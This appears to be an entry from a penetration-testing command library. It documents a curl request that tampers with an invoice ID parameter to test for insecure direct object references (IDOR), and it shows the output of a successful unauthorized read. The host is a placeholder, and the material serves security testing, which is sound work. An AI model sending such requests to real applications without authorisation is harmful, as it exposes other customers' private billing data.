---
type: command
executor: bash
data: 'curl -X GET "http://foo.bar/somepage?invoice=$_TARGET_INVOICE_ID" -v'
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Web
tags:
  - idor
  - recon
verified: true
validated: true
---

# curl-access-invoice-by-id

## Command

```bash
curl -X GET "http://foo.bar/somepage?invoice=$_TARGET_INVOICE_ID" -v
```

## Description

This command uses curl to perform a GET request to an application's invoice endpoint, manipulating the invoice ID parameter to test for IDOR vulnerabilities and access unauthorized invoice data.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_INVOICE_ID | The invoice identifier to manipulate (e.g., numeric ID of target invoice) | Yes |
| -X GET | Specifies HTTP GET method | Built-in |
| -v | Verbose mode for request/response details | No |

## Examples

### Basic Usage

```bash
curl -X GET "http://foo.bar/somepage?invoice=67890" -v
```

### Advanced Usage

```bash
curl -X GET "http://foo.bar/somepage?invoice=67890" -H "Cookie: session=abc123" -v
```

## Expected Output

Successful exploitation shows the target invoice's details in HTML or JSON, such as customer name, amount, and date, with HTTP 200 status. Example:

```
< HTTP/1.1 200 OK
...
<html><body>Invoice #67890: Amount $1000, Customer: John Doe</body></html>
```

Failure (if secured) returns 403 Forbidden or empty data.

## Related

- [[procedures/Exploit-Insecure-Direct-Object-References]]
